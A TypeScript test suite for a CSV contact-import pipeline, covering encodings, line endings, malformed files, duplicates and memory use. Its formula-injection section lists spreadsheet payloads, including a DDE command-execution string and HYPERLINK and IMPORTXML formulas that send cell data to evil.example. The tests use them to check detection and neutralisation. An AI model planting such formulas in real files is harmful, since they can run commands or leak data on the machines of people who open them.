import { describe, expect, it } from 'vitest';
import { CsvParseError, parseDelimited, sniffEncoding } from '../src/import/csv-parser.js';
import { importRows, runImport, type BatchResult, type ImportSink, type RowFailure } from '../src/import/pipeline.js';
import { formatRow, looksLikeFormula } from '../src/export/csv.js';

/**
 * The import corpus (BUILD-PLAN Phase 2 item 7).
 *
 * Malformed files, mixed encodings, BOMs, line endings, formula-injection
 * payloads, a 500,000-row memory profile, and duplicates both within a file
 * and against the database.
 *
 * The cases here are the ones a real audience file actually contains. Every
 * one of them was chosen because getting it wrong is silent: a mis-decoded
 * name, a shifted column, a dropped row. An import that fails loudly is a
 * support ticket; an import that succeeds wrongly is a customer emailing
 * strangers.
 */

function bytesOf(text: string): Uint8Array {
  return new TextEncoder().encode(text);
}

async function* streamOf(...chunks: Uint8Array[]): AsyncGenerator<Uint8Array> {
  for (const chunk of chunks) yield chunk;
}

async function rowsOf(bytes: Uint8Array, options = {}): Promise<string[][]> {
  const out: string[][] = [];
  for await (const row of parseDelimited(streamOf(bytes), options)) out.push(row.cells);
  return out;
}

/** Encodes text as UTF-16, with the byte-order mark Excel writes. */
function utf16(text: string, littleEndian: boolean): Uint8Array {
  const withMark = `\uFEFF${text}`;
  const bytes = new Uint8Array(withMark.length * 2);
  const view = new DataView(bytes.buffer);
  for (let i = 0; i < withMark.length; i += 1) {
    view.setUint16(i * 2, withMark.charCodeAt(i), littleEndian);
  }
  return bytes;
}

function collectingSink(existing: readonly string[] = []) {
  const known = new Set(existing);
  const written: string[] = [];

  const sink: ImportSink = {
    async writeBatch(rows): Promise<BatchResult> {
      let created = 0;
      let updated = 0;

      for (const row of rows) {
        written.push(row.email);
        // Mirrors the merge: ON CONFLICT updates an address already present.
        if (known.has(row.email)) updated += 1;
        else {
          known.add(row.email);
          created += 1;
        }
      }

      return { created, updated, skipped: 0 };
    },
  };

  return { sink, written };
}

// ------------------------------------------------------------------ encodings

describe('mixed encodings', () => {
  it('reads Excel\'s "Unicode Text" export, which is UTF-16LE', async () => {
    // Decoded as UTF-8 this arrives with a NUL between every character — no
    // error, just unusable contacts.
    const rows = await rowsOf(utf16('email,name\r\na@example.com,José\r\n', true));
    expect(rows).toEqual([
      ['email', 'name'],
      ['a@example.com', 'José'],
    ]);
  });

  it('reads UTF-16 big-endian', async () => {
    const rows = await rowsOf(utf16('email\r\nb@example.com\r\n', false));
    expect(rows).toEqual([['email'], ['b@example.com']]);
  });

  it('reads UTF-8 with a byte-order mark without gluing it to the first header', async () => {
    const rows = await rowsOf(bytesOf('\uFEFFemail,name\na@example.com,Aisha\n'));
    expect(rows[0]).toEqual(['email', 'name']);
  });

  it('reads plain UTF-8 with no mark at all', async () => {
    const rows = await rowsOf(bytesOf('email\nüser@example.com\n'));
    expect(rows[1]).toEqual(['üser@example.com']);
  });

  it('refuses a Windows-1252 file rather than importing mojibake', async () => {
    // "José" in Windows-1252: the 0xE9 is not valid UTF-8. Decoded leniently
    // it becomes "Jos<?>" — a corrupted contact with no error attached.
    const latin1 = new Uint8Array([
      ...bytesOf('email,name\na@example.com,Jos'),
      0xe9,
      ...bytesOf('\n'),
    ]);

    await expect(rowsOf(latin1)).rejects.toThrow(/not valid UTF-8/u);
  });

  it('can be told to replace bad bytes instead, when a user insists', async () => {
    const latin1 = new Uint8Array([...bytesOf('name\nJos'), 0xe9, ...bytesOf('\n')]);
    const rows = await rowsOf(latin1, { onInvalidBytes: 'replace' });
    expect(rows[1]?.[0]).toBe('Jos�');
  });

  it('refuses UTF-32 with an explanation rather than a decoding failure', async () => {
    const utf32 = new Uint8Array([0xff, 0xfe, 0x00, 0x00, 0x65, 0x00, 0x00, 0x00]);
    await expect(rowsOf(utf32)).rejects.toThrow(/UTF-32/u);
  });

  it('identifies each mark from the leading bytes alone', () => {
    expect(sniffEncoding(new Uint8Array([0xef, 0xbb, 0xbf, 0x61]))).toBe('utf-8');
    expect(sniffEncoding(new Uint8Array([0xff, 0xfe, 0x61, 0x00]))).toBe('utf-16le');
    expect(sniffEncoding(new Uint8Array([0xfe, 0xff, 0x00, 0x61]))).toBe('utf-16be');
    expect(sniffEncoding(new Uint8Array([0xff, 0xfe, 0x00, 0x00]))).toBe('utf-32le');
    expect(sniffEncoding(new Uint8Array([0x61, 0x62, 0x63, 0x64]))).toBe('utf-8');
  });

  it('decides the encoding even when the mark arrives one byte at a time', async () => {
    const bytes = utf16('a\r\nb\r\n', true);
    const chunks = Array.from(bytes, (byte) => new Uint8Array([byte]));

    const out: string[][] = [];
    for await (const row of parseDelimited(streamOf(...chunks))) out.push(row.cells);

    expect(out).toEqual([['a'], ['b']]);
  });

  it('handles a file shorter than a byte-order mark', async () => {
    expect(await rowsOf(bytesOf('a\n'))).toEqual([['a']]);
  });
});

// ------------------------------------------------------------- line endings

describe('line endings', () => {
  const cases = [
    { name: 'LF', text: 'email\na@example.com\nb@example.com\n' },
    { name: 'CRLF', text: 'email\r\na@example.com\r\nb@example.com\r\n' },
    { name: 'bare CR', text: 'email\ra@example.com\rb@example.com\r' },
    { name: 'mixed', text: 'email\r\na@example.com\nb@example.com\r' },
    { name: 'no trailing newline', text: 'email\na@example.com\nb@example.com' },
  ];

  for (const { name, text } of cases) {
    it(`reads ${name} identically`, async () => {
      expect(await rowsOf(bytesOf(text))).toEqual([
        ['email'],
        ['a@example.com'],
        ['b@example.com'],
      ]);
    });
  }
});

// ---------------------------------------------------------------- malformed

describe('malformed files', () => {
  it('rejects a file that ends inside a quoted field', async () => {
    // Returning the truncated field would import half a name.
    await expect(rowsOf(bytesOf('email\n"unterminated\n'))).rejects.toBeInstanceOf(CsvParseError);
  });

  it('rejects an unbounded field rather than buffering the rest of the file', async () => {
    await expect(
      rowsOf(bytesOf(`"${'x'.repeat(5000)}`), { maxFieldBytes: 100 }),
    ).rejects.toThrow(/unclosed quote/u);
  });

  it('rejects an absurdly wide row', async () => {
    const wide = Array.from({ length: 40 }, (_, i) => `c${i}`).join(',');
    await expect(rowsOf(bytesOf(`${wide}\n`), { maxColumns: 10 })).rejects.toThrow(/more than 10/u);
  });

  it('keeps ragged rows rather than dropping them', async () => {
    // A row with fewer columns than the header is normal in exported data.
    // Dropping it loses a contact; the pipeline reads missing cells as empty.
    const rows = await rowsOf(bytesOf('a,b,c\n1,2\n1,2,3,4\n'));
    expect(rows).toEqual([
      ['a', 'b', 'c'],
      ['1', '2'],
      ['1', '2', '3', '4'],
    ]);
  });

  it('survives a quote in the middle of an unquoted field', async () => {
    // Not legal RFC 4180, and exported by real systems constantly.
    expect(await rowsOf(bytesOf('name\nO\'Brien "Bob" Smith\n'))).toEqual([
      ['name'],
      ['O\'Brien "Bob" Smith'],
    ]);
  });

  it('reads an empty file as no rows rather than one empty row', async () => {
    expect(await rowsOf(bytesOf(''))).toEqual([]);
  });

  it('reads a header-only file as no contacts', async () => {
    const { sink } = collectingSink();
    const summary = await runImport(streamOf(bytesOf('email\n')), sink, {
      mapping: { email: 'email' },
    });
    expect(summary.totalRows).toBe(0);
  });

  it('reports the row number of a failure so the user can find it', async () => {
    const error = await rowsOf(bytesOf('a\nb\nc\n"unterminated')).catch((e: unknown) => e);
    expect((error as CsvParseError).rowNumber).toBe(4);
  });

  it('rejects a file with no email column instead of failing every row', async () => {
    const { sink } = collectingSink();
    await expect(
      runImport(streamOf(bytesOf('name,city\nAisha,Dubai\n')), sink, {
        mapping: { name: 'firstName' },
      }),
    ).rejects.toThrow(/nothing to import/u);
  });

  it('keeps going past a row it cannot use', async () => {
    const { sink, written } = collectingSink();
    const failures: RowFailure[] = [];

    const summary = await runImport(
      streamOf(bytesOf('email\ngood1@example.com\n\nnot-an-email\ngood2@example.com\n')),
      sink,
      { mapping: { email: 'email' } },
      { onFailures: (batch) => void failures.push(...batch) },
    );

    expect(written).toEqual(['good1@example.com', 'good2@example.com']);
    expect(summary.failed).toBe(2);
    expect(failures.map((f) => f.errorCode).sort()).toEqual(['email_invalid', 'email_missing']);
  });
});

// --------------------------------------------------------- formula injection

describe('formula injection', () => {
  const payloads = [
    '=1+1',
    '+1+1',
    '-1+1',
    '@SUM(A1)',
    '=cmd|\'/c calc\'!A1',
    '=HYPERLINK("http://evil.example/?d="&A1,"Click")',
    '\t=1+1',
    '\r=1+1',
    '=IMPORTXML("http://evil.example","//a")',
    '@import',
  ];

  for (const payload of payloads) {
    it(`flags ${JSON.stringify(payload)} on import and neutralises it on export`, async () => {
      expect(looksLikeFormula(payload)).toBe(true);

      // Imported as-is but flagged (docs/06): the value is the customer's
      // data and we do not silently rewrite it.
      const { sink } = collectingSink();
      const flagged: boolean[] = [];

      const recording: ImportSink = {
        async writeBatch(rows) {
          for (const row of rows) flagged.push(row.flagged);
          return sink.writeBatch(rows);
        },
      };

      await runImport(
        streamOf(bytesOf(`email,first_name\na@example.com,"${payload.replaceAll('"', '""')}"\n`)),
        recording,
        { mapping: { email: 'email', first_name: 'firstName' } },
      );

      expect(flagged).toEqual([true]);

      // Neutralised on the way out, so the spreadsheet never evaluates it.
      const exported = formatRow([payload]);
      expect(exported.startsWith("'") || exported.startsWith('"\'')).toBe(true);
    });
  }

  it('leaves an ordinary value alone in both directions', async () => {
    expect(looksLikeFormula('Aisha')).toBe(false);
    expect(formatRow(['Aisha'])).toBe('Aisha');
  });

  it('flags a negative number too, which is the cost of the rule', async () => {
    // A leading minus is a formula prefix to a spreadsheet, so "-5" is
    // flagged and neutralised like any other. That is a deliberate
    // false positive: docs/06 names the prefix set, and narrowing it to
    // exclude things that parse as numbers would let "-2+cmd|..." through.
    const { sink } = collectingSink();
    const flagged: boolean[] = [];

    const recording: ImportSink = {
      async writeBatch(rows) {
        for (const row of rows) flagged.push(row.flagged);
        return sink.writeBatch(rows);
      },
    };

    await runImport(
      streamOf(bytesOf('email,score\na@example.com,-5\n')),
      recording,
      { mapping: { email: 'email', score: 'score' } },
    );

    expect(flagged).toEqual([true]);
  });
});

// ----------------------------------------------------------------- duplicates

describe('duplicates within the file', () => {
  it('keeps the first occurrence and reports the rest', async () => {
    const { sink, written } = collectingSink();
    const failures: RowFailure[] = [];

    const summary = await runImport(
      streamOf(
        bytesOf(
          'email,first_name\na@example.com,First\nb@example.com,Bo\na@example.com,Second\nA@EXAMPLE.COM,Third\n',
        ),
      ),
      sink,
      { mapping: { email: 'email', first_name: 'firstName' } },
      { onFailures: (batch) => void failures.push(...batch) },
    );

    expect(written).toEqual(['a@example.com', 'b@example.com']);
    expect(summary.duplicatesInFile).toBe(2);
    expect(failures.every((f) => f.errorCode === 'duplicate_in_file')).toBe(true);
    expect(failures.map((f) => f.rowNumber)).toEqual([4, 5]);
  });

  it('treats an address differing only in case or padding as the same contact', async () => {
    const { sink, written } = collectingSink();
    const summary = await runImport(
      streamOf(bytesOf('email\n  a@example.com \nA@Example.Com\n')),
      sink,
      { mapping: { email: 'email' } },
    );

    expect(written).toEqual(['a@example.com']);
    expect(summary.duplicatesInFile).toBe(1);
  });
});

describe('duplicates against the database', () => {
  /**
   * The merge decides created-versus-updated, not the pipeline.
   *
   * This proves the accounting and the plumbing: what the sink reports flows
   * into the summary the user sees. The SQL itself — ON CONFLICT with
   * `xmax = 0` — has no database to run against here and is unverified.
   */
  it('counts an address already present as updated, not created', async () => {
    const { sink, written } = collectingSink(['existing@example.com']);

    const summary = await runImport(
      streamOf(bytesOf('email\nexisting@example.com\nnew@example.com\n')),
      sink,
      { mapping: { email: 'email' } },
    );

    expect(written).toEqual(['existing@example.com', 'new@example.com']);
    expect(summary.created).toBe(1);
    expect(summary.updated).toBe(1);
  });

  it('carries a skipped count through when the merge declines to update', async () => {
    // updateExisting off: the row is present, nothing changes, and the user
    // is told it was skipped rather than silently counted as a success.
    const sink: ImportSink = {
      async writeBatch(rows) {
        return { created: 0, updated: 0, skipped: rows.length };
      },
    };

    const summary = await runImport(
      streamOf(bytesOf('email\nexisting@example.com\n')),
      sink,
      { mapping: { email: 'email' } },
    );

    expect(summary.skipped).toBe(1);
    expect(summary.created).toBe(0);
  });

  it('separates the two kinds of duplicate in the summary', async () => {
    // One address repeated in the file, one already in the database. They are
    // different problems and the report distinguishes them.
    const { sink } = collectingSink(['existing@example.com']);

    const summary = await runImport(
      streamOf(bytesOf('email\nexisting@example.com\nnew@example.com\nnew@example.com\n')),
      sink,
      { mapping: { email: 'email' } },
    );

    expect(summary.updated).toBe(1);
    expect(summary.created).toBe(1);
    expect(summary.duplicatesInFile).toBe(1);
  });
});

// -------------------------------------------------------------- memory profile

describe('500,000-row memory profile', () => {
  /**
   * BUILD-PLAN Phase 2 gate: "500k-row import with flat resident memory".
   *
   * Dedupe tracking is switched off here, because it is the one thing in the
   * pipeline that is *meant* to grow with the file — a Set of 500,000
   * addresses is tens of megabytes by design. What this asserts is that
   * everything else is flat: the parser, the batching and the summary.
   */
  it('holds steady over 500,000 rows', async () => {
    const rowCount = 500_000;
    let largestBatch = 0;
    let total = 0;

    const sink: ImportSink = {
      async writeBatch(rows) {
        largestBatch = Math.max(largestBatch, rows.length);
        total += rows.length;
        return { created: rows.length, updated: 0, skipped: 0 };
      },
    };

    async function* generate(): AsyncGenerator<Uint8Array> {
      const encoder = new TextEncoder();
      yield encoder.encode('email,first_name,country\n');
      for (let i = 0; i < rowCount; i += 1) {
        yield encoder.encode(`user${i}@example.com,Name ${i},AE\n`);
      }
    }

    global.gc?.();
    const before = process.memoryUsage().heapUsed;

    const summary = await importRows(
      (async function* rows() {
        yield* parseDelimited(generate());
      })(),
      sink,
      {
        mapping: { email: 'email', first_name: 'firstName', country: 'country' },
        batchSize: 1000,
        maxTrackedEmails: 0,
      },
    );

    global.gc?.();
    const growthMb = (process.memoryUsage().heapUsed - before) / (1024 * 1024);

    expect(total).toBe(rowCount);
    expect(summary.created).toBe(rowCount);
    expect(largestBatch).toBe(1000);

    // Generous, because heapUsed without a forced collection is noisy. The
    // failure this catches is the one that matters: accumulation proportional
    // to the file, which at 500,000 rows would be hundreds of megabytes.
    expect(growthMb).toBeLessThan(96);
  }, 300_000);

  it('reports that dedupe tracking was abandoned rather than growing past its bound', async () => {
    const sink: ImportSink = {
      async writeBatch(rows) {
        return { created: rows.length, updated: 0, skipped: 0 };
      },
    };

    async function* generate(): AsyncGenerator<Uint8Array> {
      const encoder = new TextEncoder();
      yield encoder.encode('email\n');
      for (let i = 0; i < 5000; i += 1) yield encoder.encode(`u${i}@example.com\n`);
    }

    const summary = await runImport(generate(), sink, {
      mapping: { email: 'email' },
      maxTrackedEmails: 100,
    });

    expect(summary.duplicateTrackingTruncated).toBe(true);
    // Everything still imported; the database unique index remains the
    // backstop, duplicates simply cost more.
    expect(summary.created).toBe(5000);
  }, 60_000);
});
